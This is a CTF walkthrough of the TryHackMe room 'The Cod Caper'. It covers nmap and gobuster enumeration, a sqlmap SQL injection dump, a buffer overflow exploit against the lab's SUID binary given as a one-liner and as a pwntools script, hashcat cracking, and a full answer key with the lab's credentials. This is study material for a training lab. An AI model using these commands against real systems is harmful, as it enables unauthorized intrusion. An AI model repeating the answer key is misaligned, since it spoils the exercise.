# 🐟 The Cod Caper 

---

link to the room: https://tryhackme.com/room/thecodcaper

---
<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-Cod%20Caper-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Difficulty-Easy%20%2F%20Medium-yellow?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Category-Linux%20Exploitation-red?style=for-the-badge" />
</p>

---

## 📌 Overview

The Cod Caper is a guided penetration testing room where you:

* Enumerate a Linux server
* Exploit a web application
* Gain shell access
* Perform privilege escalation
* Exploit a vulnerable binary (buffer overflow)
* Crack password hashes

---

## 🎯 Objectives

* Perform network scanning
* Enumerate web services
* Exploit SQL injection
* Gain shell access
* Perform privilege escalation
* Exploit SUID binary
* Crack password hashes

---

## 🧠 Key Concepts

* Nmap enumeration
* Gobuster directory brute-force
* SQL Injection (SQLMap)
* Reverse shells
* Linux privilege escalation
* SUID exploitation
* Buffer overflow
* Pwntools exploitation
* Hash cracking (Hashcat)

---

# 🧪 WALKTHROUGH

---

## 🔹 1. Enumeration

```bash
nmap -sC -sV -A MACHINE_IP
```

✔ Found:

* 2 open ports
* SSH + Apache

---

## 🔹 2. Web Enumeration

```bash
gobuster dir -u http://MACHINE_IP -w big.txt -x php,html,txt
```

✔ Found:

```
administrator.php
```

---

## 🔹 3. SQL Injection

```bash
sqlmap -u http://MACHINE_IP/administrator.php --forms --dump
```

✔ Credentials:

```
Username: pingudad
Password: secretpass
```

✔ Vulnerable to:

```
3 types of SQLi
```

---

## 🔹 4. Command Execution

✔ Reverse shell / file enumeration

✔ Found:

* SSH account exists
* Password:

```
pinguapingu
```

✔ Files in directory:

```
3
```

---

## 🔹 5. Privilege Escalation (LinEnum)

✔ Found SUID binary:

```
/opt/secret/root
```

---

## 🔹 6. Binary Analysis

### Vulnerability:

* Buffer overflow
* 32-byte buffer
* EIP overwrite at:

```
44 bytes
```

---

## 🔹 7. Exploit (Manual)

```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

✔ Executes shell function
✔ Dumps shadow backup

---

## 🔹 8. Exploit (Pwntools)

```python
from pwn import *

proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')

payload = fit({
    44: elf.symbols.shell
})

proc.sendline(payload)
proc.interactive()
```

✔ Successful exploitation

---

## 🔹 9. Password Cracking

```bash
hashcat -m 1800 hash.txt rockyou.txt
```

✔ Root password:

```
love2fish
```

---

# ✅ FULL QUESTIONS & ANSWERS

---

## 🔹 Task 1

**Q:** Help me out!
**A:** No answer needed

---

## 🔹 Task 2

**Q:** How many ports are open?
**A:** 2

**Q:** Web server title?
**A:** Apache2 Ubuntu Default Page: It works

**Q:** SSH version?
**A:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

**Q:** Web server version?
**A:** Apache/2.4.18

---

## 🔹 Task 3

**Q:** Important file name?
**A:** administrator.php

---

## 🔹 Task 4

**Q:** Admin username?
**A:** pingudad

**Q:** Admin password?
**A:** secretpass

**Q:** SQLi types?
**A:** 3

---

## 🔹 Task 5

**Q:** Files in directory?
**A:** 3

**Q:** Do I have an account?
**A:** yes

**Q:** SSH password?
**A:** pinguapingu

---

## 🔹 Task 6

**Q:** Interesting SUID path?
**A:** /opt/secret/root

---

## 🔹 Task 7

**Q:** Read above
**A:** No answer needed

---

## 🔹 Task 8

**Q:** Manual exploitation
**A:** No answer needed

---

## 🔹 Task 9

**Q:** Pwntools exploitation
**A:** No answer needed

---

## 🔹 Task 10

**Q:** Root password?
**A:** love2fish

---

## 🔹 Task 11

**Q:** Completed
**A:** No answer needed

---

# 🚀 Attack Flow Summary

1. Scan → identify services
2. Enumerate web → find admin panel
3. Exploit SQL injection
4. Gain credentials
5. Access system
6. Find SUID binary
7. Exploit buffer overflow
8. Dump password hashes
9. Crack root password

---

## ⚠️ Key Takeaways

* Enumeration is critical
* SQL injection can expose credentials
* SUID binaries are high-risk
* Buffer overflow = powerful exploit
* Hash cracking completes privilege escalation

---

## 💡 Final Insight

This room demonstrates a full attack chain:

➡️ Web → System → Binary → Root

Mastering this = strong penetration testing foundation

---

## 📚 Reference

TryHackMe — The Cod Caper 

---

## 🏁 Final Thought

From basic enumeration to binary exploitation — this is a **complete beginner pentest journey**

---
